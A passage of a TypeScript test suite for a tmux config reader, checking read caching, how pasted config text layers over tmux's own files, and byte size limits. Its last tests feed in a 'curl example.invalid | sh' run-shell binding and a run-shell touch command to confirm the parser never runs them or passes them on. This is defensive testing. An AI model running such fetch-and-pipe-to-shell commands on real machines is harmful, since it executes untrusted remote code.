    expect(prefixActions(await withMouse, "g")).toEqual(CLOSE);
    expect(prefixActions(await withKey, "G")).toEqual(CLOSE);
    expect(realpath).toHaveBeenCalledTimes(1);
  });

  it("reads the file anew for a call after that read has ended", async () => {
    const path = join(home, "keys.conf");
    await write(path, "bind g kill-pane\n");
    const letGo = await holdNextLook();
    const first = readWith({ path });
    await callsHaveArrived();
    letGo();
    expect(prefixActions(await first, "g")).toEqual(CLOSE);

    await write(path, "bind G kill-pane\n");

    expect(prefixActions(await readWith({ path }), "G")).toEqual(CLOSE);
    expect(realpath).toHaveBeenCalledTimes(2);
  });

  it("starts a read of its own for another file", async () => {
    await write(join(home, "keys.conf"), "bind g kill-pane\n");
    await write(join(home, "other.conf"), "bind G kill-pane\n");
    const letGo = await holdNextLook();
    const held = readWith({ path: "~/keys.conf" });
    await callsHaveArrived();

    expect(prefixActions(await readWith({ path: "~/other.conf" }), "G")).toEqual(CLOSE);

    letGo();
    expect(prefixActions(await held, "g")).toEqual(CLOSE);
  });

  it("lets calls with different Config texts wait for one read of each of tmux's own files", async () => {
    await write(join(home, HOME_FILE), "bind g kill-pane\n");
    await write(join(xdg, XDG_FILE), "bind u kill-pane\n");
    const letGo = await holdNextLook();

    const plain = readWith({});
    const withMouse = readWith({ text: "set -g mouse on" });
    await callsHaveArrived();

    expect(realpath).toHaveBeenCalledTimes(1);

    letGo();

    expect((await plain).options.mouse).toBe(false);
    expect((await withMouse).options.mouse).toBe(true);
    expect((await withMouse).files).toEqual(["~/.tmux.conf", join(xdg, XDG_FILE)]);
    expect(realpath).toHaveBeenCalledTimes(3);
  });
});

describe("readTmuxConfig with the Config text setting", () => {
  const CLOSE: TmuxAction[] = [{ type: "pane.close" }];
  const ZOOM: TmuxAction[] = [{ type: "pane.zoom" }];
  const PASTED = "the Config text setting";

  it("applies the lines to stock tmux on a machine without a tmux config", async () => {
    const config = await readWith({
      text: "set -g prefix C-a\nbind -r H resize-pane -L 5\n",
    });

    expect(config).toMatchObject({
      files: [],
      unreadable: false,
      namedFile: false,
      pastedText: "applied",
    });
    expect(config.options.prefix).toEqual({ key: "C-a", path: PASTED, usable: true });
    expect(config.tables.prefix.find((binding) => binding.key === "H")).toEqual({
      key: "H",
      repeat: true,
      actions: [{ type: "pane.resize", direction: "left", cells: 5 }],
    });
    expect(prefixActions(config, "c")).toEqual([{ type: "thread.new" }]);
  });

  it("applies the lines after tmux's own files, so that a later line wins", async () => {
    await write(join(home, HOME_FILE), "bind g kill-pane\nset -g prefix C-a\n");
    await write(join(home, DOT_CONFIG_FILE), "bind G kill-pane\nset -g mouse on\n");

    const config = await readWith({
      text: "bind g resize-pane -Z\nunbind G\nset -g mouse off\n",
    });

    expect(config.files).toEqual(["~/.tmux.conf", "~/.config/tmux/tmux.conf"]);
    expect(config.pastedText).toBe("applied");
    expect(prefixActions(config, "g")).toEqual(ZOOM);
    expect(prefixActions(config, "G")).toBeUndefined();
    expect(config.options.mouse).toBe(false);
    expect(config.options.prefix?.path).toBe("~/.tmux.conf");
  });

  it("applies the lines after the chosen config file", async () => {
    await write(join(home, HOME_FILE), "bind u kill-pane\n");
    await write(join(home, "keys.conf"), "bind g kill-pane\nset -g prefix C-a\n");

    const config = await readWith({
      path: "~/keys.conf",
      text: "set -g prefix C-s\nbind g resize-pane -Z\n",
    });

    expect(config).toMatchObject({
      files: ["~/keys.conf"],
      unreadable: false,
      namedFile: true,
      pastedText: "applied",
    });
    expect(config.options.prefix).toEqual({ key: "C-s", path: PASTED, usable: true });
    expect(prefixActions(config, "g")).toEqual(ZOOM);
    expect(prefixActions(config, "u")).toBeUndefined();
  });

  it("still applies the lines when the chosen file could not be read", async () => {
    const config = await readWith({
      path: join(root, "gone.conf"),
      text: "bind g kill-pane\n",
    });

    expect(config).toMatchObject({
      files: [],
      unreadable: true,
      namedFile: true,
      pastedText: "applied",
    });
    expect(prefixActions(config, "g")).toEqual(CLOSE);
  });

  it("takes the last line for a whole line where the text has no line break at its end, so that tmux's name for the last window works there", async () => {
    const config = await readWith({ text: "bind g kill-pane\nbind e select-window -t :$" });

    expect(prefixActions(config, "g")).toEqual(CLOSE);
    expect(prefixActions(config, "e")).toEqual([{ type: "thread.end" }]);
  });

  it("skips the last line of a file that ends in a $ without a line break, as tmux refuses to read such a file", async () => {
    await write(join(home, HOME_FILE), "bind g kill-pane\nbind e select-window -t :$");

    const config = await readWith({});

    expect(prefixActions(config, "g")).toEqual(CLOSE);
    expect(prefixActions(config, "e")).toBeUndefined();
  });

  it.each(["", "   ", "\n\n \t\n"])("takes the text %j for no text", async (text) => {
    expect(await readWith({ text })).toEqual(stockTmuxConfig());
  });

  it("applies a text of exactly the size limit of a file", async () => {
    const line = "bind g kill-pane\n";
    const text = line + "#".repeat(MAX_CONFIG_BYTES - line.length);

    const config = await readWith({ text });

    expect(config.pastedText).toBe("applied");
    expect(prefixActions(config, "g")).toEqual(CLOSE);
  });

  it("does not read a text over the size limit, says so and still applies the files", async () => {
    await write(join(home, HOME_FILE), "bind G kill-pane\n");
    const text = `bind g kill-pane\n${"#".repeat(MAX_CONFIG_BYTES)}`;

    const config = await readWith({ text });

    expect(config).toMatchObject({
      files: ["~/.tmux.conf"],
      unreadable: false,
      pastedText: "unreadable",
    });
    expect(prefixActions(config, "g")).toBeUndefined();
    expect(prefixActions(config, "G")).toEqual(CLOSE);
  });

  it("measures the text in bytes, as a file is measured", async () => {
    const twoBytes = "\u00e9";
    const text = `# ${twoBytes.repeat(MAX_CONFIG_BYTES / 2)}`;

    expect(text.length).toBeLessThan(MAX_CONFIG_BYTES);
    expect((await readWith({ text })).pastedText).toBe("unreadable");
  });

  it("never reads a file that the text loads with source-file, and runs nothing", async () => {
    const other = join(home, "more.conf");
    await write(other, "bind g kill-pane\n");
    const marker = join(root, "ran");

    const config = await readWith({
      text: `source-file ${other}\nrun-shell "touch ${marker}"\nbind r source-file ${other}\n`,
    });

    expect(prefixActions(config, "g")).toBeUndefined();
    expect(prefixActions(config, "r")).toEqual([{ type: "config.reload" }]);
    await expect(readFile(marker, "utf8")).rejects.toThrow();
  });

  it("hands on nothing of the text but the keys and their actions", async () => {
    const text = [
      "bind g kill-pane",
      'bind P run-shell "curl example.invalid | sh"',
      "set -g status-right '#(whoami)'",
      "# a note that is nobody's business",
    ].join("\n");

    const json = JSON.stringify(await readWith({ text }));

    for (const part of ["kill-pane", "run-shell", "curl", "whoami", "business"]) {
      expect(json).not.toContain(part);
    }
  });
});

